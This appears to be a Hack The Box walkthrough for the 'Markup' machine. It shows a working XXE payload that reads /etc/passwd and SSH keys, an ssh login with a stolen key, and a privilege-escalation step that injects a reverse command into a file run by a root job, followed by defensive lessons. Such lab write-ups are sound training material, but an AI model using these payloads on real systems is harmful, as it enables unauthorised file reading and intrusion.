---
title: "Markup — Hack The Box Walkthrough"
description: "Exploiting XXE to read SSH keys and escalating to root via scheduled task abuse on Markup."
date: 2026-09-02
category: offensive
readTime: "5 min read"
mitre:
  - "T1190"
  - "T1068"
tags:
  - "Hack The Box"
  - "XXE"
  - "XML"
  - "SSH Keys"
  - "Scheduled Tasks"
  - "Linux"
  - "CTF"
summary: "Exploiting XXE to read SSH keys and escalating to root via scheduled task abuse on Markup."
---

**Machine:** Markup
**Difficulty:** Easy
**Key Techniques:** XXE, XML External Entity, SSH key theft, scheduled task privesc

---

## Enumeration

### Port Scanning

```
22/tcp  open  ssh
80/tcp  open  http    (Title: MegaShopping)
443/tcp open  https   (Title: MegaShopping)
```

The site is **MegaShopping**, a PHP e-commerce app with a login/register form. The PHP session cookie lacks `HttpOnly`/`Secure` flags.

---

## Exploitation

### XXE

Register/login and submit an order/note that is processed as **XML**. Inject an XXE payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<order><item>&xxe;</item></order>
```

The response reflects `/etc/passwd`. Use XXE to read sensitive files, including a user's SSH private key or app configs:

```
ssh -i id_rsa user@10.129.74.71
```

```
user.txt: <flag>
```

---

## Privilege Escalation

Enumerate for a privileged scheduled task or a writable file consumed by a root job. Inject a reverse command into that file and the root job executes it.

```
root.txt: <flag>
```

---

## Lessons Learned

1. **Disable external entities** in the XML parser — XXE lets you read arbitrary local files.
2. **Set `Secure` + `HttpOnly` flags on session cookies**, especially over HTTPS.
3. **Never store SSH private keys** where they can be read via XXE/LFI.
4. **Writable files consumed by privileged jobs** are an escalation path — protect them.
